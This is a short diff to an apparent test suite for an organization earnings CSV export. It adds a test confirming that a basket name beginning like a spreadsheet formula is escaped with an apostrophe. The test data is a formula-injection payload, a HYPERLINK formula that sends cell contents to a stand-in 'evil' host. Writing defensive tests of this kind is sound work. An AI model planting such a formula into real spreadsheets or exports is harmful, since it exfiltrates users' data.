@@ -81,6 +81,13 @@ describe("organization earnings", () => {
     expect(lines[1]).toBe('2026-08-15T10:00:00.000Z,"Core, ""Crypto""",1,manager_rebalance,1,sigCCC');
     expect(lines[3]).toBe('2026-09-12T10:00:00.000Z,"Core, ""Crypto""",1,manager_entry,3,sigBBB');
   });
+
+  it("a basket name that starts like a formula is prefixed with an apostrophe in the CSV", async () => {
+    const { basket } = await arrange();
+    await adminSql`UPDATE app.basket_versions SET name = '=HYPERLINK("https://evil/?"&A1,"x")' WHERE id = ${basket.versionId}`;
+    const res = await request(app).get(`/v1/organizations/${basket.owner.id}/earnings?format=csv`).set(basket.owner.h);
+    expect(res.text).toContain(`,"'=HYPERLINK(""https://evil/?""&A1,""x"")",1,`);
+  });
 });
 
 describe("platform revenue (ops)", () => {
